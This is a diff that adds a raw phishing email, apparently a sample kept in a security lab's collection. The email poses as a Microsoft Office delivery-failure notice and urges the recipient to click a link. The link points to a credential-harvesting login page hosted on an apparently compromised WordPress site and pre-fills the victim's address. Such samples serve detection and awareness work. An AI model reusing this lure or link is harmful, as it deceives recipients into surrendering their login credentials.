@@ -1,0 +1,149 @@
+Return-Path: <MAILER-DAEMON>
+Delivered-To: hallgato@itseclabs.local
+Received: from localhost (mail.itseclabs.local [127.0.0.1])
+	by gw.itseclabs.local (Postfix) with ESMTP id 645E51D9F0E
+	for <hallgato@itseclabs.local>; Fri, 20 Dec 2019 07:30:18 +0000 (UTC)
+X-Virus-Scanned: Debian amavisd-new at gw.itseclabs.local
+Received: from gw.itseclabs.local ([127.0.0.1])
+	by localhost (mail.itseclabs.local [127.0.0.1]) (amavisd-new, port 10024)
+	with ESMTP id tipytDI6zLJJ for <hallgato@itseclabs.local>;
+	Fri, 20 Dec 2019 07:30:16 +0000 (UTC)
+Received: from mail.itseclabs.local (mail.itseclabs.local [193.6.200.101])
+	by gw.itseclabs.local (Postfix) with ESMTPS id E5AA91D9F8B
+	for <hallgato@itseclabs.local>; Fri, 20 Dec 2019 07:30:16 +0000 (UTC)
+Received: by mail.itseclabs.local (Postfix, from userid 1208)
+	id C77452A04C7; Fri, 20 Dec 2019 08:30:16 +0100 (CET)
+Authentication-Results:mail.itseclabs.local; dkim=permerror (bad message/signature format)
+X-Original-To: hallgato@itseclabs.local
+Delivered-To: hallgato@itseclabs.local
+Received: from localhost (localhost.localdomain [127.0.0.1])
+	by mail.itseclabs.local (Postfix) with ESMTP id 867C12A04CA;
+	Fri, 20 Dec 2019 08:30:16 +0100 (CET)
+X-Virus-Scanned: Debian amavisd-new at itseclabs.local
+Received: from mail.itseclabs.local ([127.0.0.1])
+	by localhost (itseclabs.local [127.0.0.1]) (amavisd-new, port 10024)
+	with ESMTP id sAV6y67BNH3H; Fri, 20 Dec 2019 08:30:13 +0100 (CET)
+Received: from duflex.itseclabs.local (duflex.itseclabs.local [195.70.56.227])
+	(using TLSv1.2 with cipher ADH-AES256-GCM-SHA384 (256/256 bits))
+	(No client certificate requested)
+	by mail.itseclabs.local (Postfix) with ESMTPS id C510E2A024E;
+	Fri, 20 Dec 2019 08:30:13 +0100 (CET)
+Authentication-Results:mail.itseclabs.local; dkim=permerror (bad message/signature format)
+Received: by duflex.itseclabs.local (Postfix)
+	id A22DC20092; Fri, 20 Dec 2019 08:30:13 +0100 (CET)
+Delivered-To: info@itseclabs.local
+Received: from localhost (localhost [127.0.0.1])
+	by duflex.itseclabs.local (Postfix) with ESMTP id 78A5A20095
+	for <info@itseclabs.local>; Fri, 20 Dec 2019 08:30:13 +0100 (CET)
+X-Virus-Scanned: Debian amavisd-new at duflex.itseclabs.local
+Received: from duflex.itseclabs.local ([127.0.0.1])
+	by localhost (duflex-2.itseclabs.local [127.0.0.1]) (amavisd-new, port 10024)
+	with ESMTP id kBKQdJb_3G-l for <info@itseclabs.local>;
+	Fri, 20 Dec 2019 08:30:10 +0100 (CET)
+X-Greylist: delayed 349 seconds by postgrey-1.36 at duflex-2; Fri, 20 Dec 2019 08:30:10 CET
+Authentication-Results:duflex.itseclabs.local; dkim=permerror (bad message/signature format)
+Received: from securemail-r8.synaq.com (securemail-r8.synaq.com [196.35.198.124])
+	by duflex.itseclabs.local (Postfix) with ESMTPS id 5034520092
+	for <info@itseclabs.local>; Fri, 20 Dec 2019 08:30:10 +0100 (CET)
+Received: from ec2-54-196-139-255.compute-1.amazonaws.com ([54.196.139.255] helo=WIN-LEEJF2SLRSI.ec2.internal)
+	by securemail-pl-omx8.synaq.com with esmtpsa (TLSv1:DHE-RSA-AES256-SHA:256)
+	(Exim 4.92.3)
+	id 1iiCe5-000bhL-S8
+	for info@itseclabs.local; Fri, 20 Dec 2019 09:24:22 +0200
+Content-Type: multipart/alternative; boundary="===============1726806072=="
+MIME-Version: 1.0
+Subject: [Notification] Mail Failure Delivery Notice
+To: info@itseclabs.local
+From: "MAILER-DAEMON" <>
+Date: Fri, 20 Dec 2019 07:23:49 +0000
+X-UNKNOWN-NULL: Yes
+X-SYNAQ-Pinpoint-Information: Please contact SYNAQ for more information
+X-SYNAQ-Pinpoint-ID: 1iiCe5-000bhL-S8
+X-SYNAQ-Pinpoint: Found to be clean
+X-SYNAQ-Pinpoint-SpamCheck: not spam, SpamAssassin (not cached, score=5.56,
+	required 9, autolearn=disabled, ALL_TRUSTED -1.00, DCC_CHECK 0.10,
+	DCC_REPUT_99_100 1.20, FROM_NO_USER 2.60, HTML_MESSAGE 0.00,
+	MISSING_MID 0.14, NULLSENDER 0.01, T_KAM_HTML_FONT_INVALID 0.01,
+	URIBL_PH_SURBL 0.00, URI_WP_HACKED_2 2.50)
+X-SYNAQ-Pinpoint-SpamScore: sssss
+X-Pinpoint-From: 
+Message-Id: <20191220073016.C77452A04C7@mail.itseclabs.local>
+
+You will not see this in a MIME-aware mail reader.
+--===============1726806072==
+Content-Type: text/plain; charset="iso-8859-1"
+MIME-Version: 1.0
+Content-Transfer-Encoding: quoted-printable
+Content-Description: Mail message body
+
+Microsoft Office Failure Delivery Notice. User: info@itseclabs.local
+ =
+
+ 3 pending sent message couldn't be delivered =
+
+
+ =
+
+ Action Required.    =
+
+How to Fix It. =
+
+Click here to view undelivered sent email. =
+
+ Created Date: 20 12 2019
+--===============1726806072==
+Content-Type: text/html; charset="iso-8859-1"
+MIME-Version: 1.0
+Content-Transfer-Encoding: quoted-printable
+Content-Description: Mail message body
+
+<HTML><head><meta http-equiv=3D"Content-Type" content=3D"text/html; charset=
+=3Diso-8859-1"/></head><BODY><DIV style=3D"FONT-SIZE: 15px; BORDER-TOP: 0px=
+; BORDER-RIGHT: 0px; VERTICAL-ALIGN: baseline; BORDER-BOTTOM: 0px; COLOR: r=
+gb(32,31,30); PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; MAR=
+GIN: 0px; BORDER-LEFT: 0px; PADDING-RIGHT: 0px; font-variant-numeric: inher=
+it; font-variant-east-asian: inherit; font-stretch: inherit"><B>Microsoft O=
+ffice Failure Delivery Notice.</B></DIV>
+<DIV style=3D"FONT-SIZE: 15px; BORDER-TOP: 0px; BORDER-RIGHT: 0px; VERTICAL=
+-ALIGN: baseline; BORDER-BOTTOM: 0px; COLOR: rgb(32,31,30); PADDING-BOTTOM:=
+ 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px; BORDER-LEFT: 0px; P=
+ADDING-RIGHT: 0px; font-variant-numeric: inherit; font-variant-east-asian: =
+inherit; font-stretch: inherit">User:&nbsp;<B>info@itseclabs.local</B><BR></DIV>
+<DIV style=3D"FONT-SIZE: 15px; BORDER-TOP: 0px; BORDER-RIGHT: 0px; VERTICAL=
+-ALIGN: baseline; BORDER-BOTTOM: 0px; COLOR: rgb(32,31,30); PADDING-BOTTOM:=
+ 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px; BORDER-LEFT: 0px; P=
+ADDING-RIGHT: 0px; font-variant-numeric: inherit; font-variant-east-asian: =
+inherit; font-stretch: inherit"><BR></DIV>
+<P style=3D"FONT-SIZE: 15px; COLOR: rgb(32,31,30)">3 pending sent message c=
+ouldn't be delivered&nbsp;<BR></P>
+<DIV style=3D"FONT-SIZE: 15px; BORDER-TOP: 0px; BORDER-RIGHT: 0px; VERTICAL=
+-ALIGN: baseline; BORDER-BOTTOM: 0px; COLOR: rgb(32,31,30); PADDING-BOTTOM:=
+ 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px; BORDER-LEFT: 0px; P=
+ADDING-RIGHT: 0px; font-variant-numeric: inherit; font-variant-east-asian: =
+inherit; font-stretch: inherit"><BR></DIV>
+<DIV style=3D"FONT-SIZE: 15px; BORDER-TOP: 0px; BORDER-RIGHT: 0px; VERTICAL=
+-ALIGN: baseline; BORDER-BOTTOM: 0px; COLOR: rgb(32,31,30); PADDING-BOTTOM:=
+ 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px; BORDER-LEFT: 0px; P=
+ADDING-RIGHT: 0px; font-variant-numeric: inherit; font-variant-east-asian: =
+inherit; font-stretch: inherit">Action Required.&nbsp; &nbsp;&nbsp;<BR>How =
+to Fix It.
+<DIV style=3D"BORDER-TOP: 0px; BORDER-RIGHT: 0px; VERTICAL-ALIGN: baseline;=
+ BORDER-BOTTOM: 0px; COLOR: ; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDIN=
+G-LEFT: 0px; MARGIN: 0px; BORDER-LEFT: 0px; PADDING-RIGHT: 0px"><BR><B><A s=
+tyle=3D"BORDER-TOP: 0px; BORDER-RIGHT: 0px; VERTICAL-ALIGN: baseline; BORDE=
+R-BOTTOM: 0px; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; MA=
+RGIN: 0px; BORDER-LEFT: 0px; PADDING-RIGHT: 0px" href=3D"https://new.teline=
+t.se/wp-content/plugins/revslider/temp/update_extract/Login/ii/?email=3Dinf=
+o@itseclabs.local" rel=3D"noopener noreferrer" target=3D_blank data-saferedirecturl=
+=3D"https://www.google.com/url?q=3Dhttps://new.telinet.se/wp-content/plugin=
+s/revslider/temp/update_extract/Login/ii/?email%3D25&amp;source=3Dgmail&amp=
+;ust=3D1576886840560000&amp;usg=3DAFQjCNGJRYBvcY7zM_-JTS3_luOgUI3HmA">Click=
+ here</A></B>&nbsp;to view undelivered sent email.</DIV>
+<DIV style=3D"BORDER-TOP: 0px; BORDER-RIGHT: 0px; VERTICAL-ALIGN: baseline;=
+ BORDER-BOTTOM: 0px; COLOR: ; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDIN=
+G-LEFT: 0px; MARGIN: 0px; BORDER-LEFT: 0px; PADDING-RIGHT: 0px"><BR></DIV>
+<DIV style=3D"BORDER-TOP: 0px; BORDER-RIGHT: 0px; VERTICAL-ALIGN: baseline;=
+ BORDER-BOTTOM: 0px; COLOR: ; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDIN=
+G-LEFT: 0px; MARGIN: 0px; BORDER-LEFT: 0px; PADDING-RIGHT: 0px">Created Dat=
+e: 20 12 2019</DIV></DIV></BODY></HTML>
+--===============1726806072==--
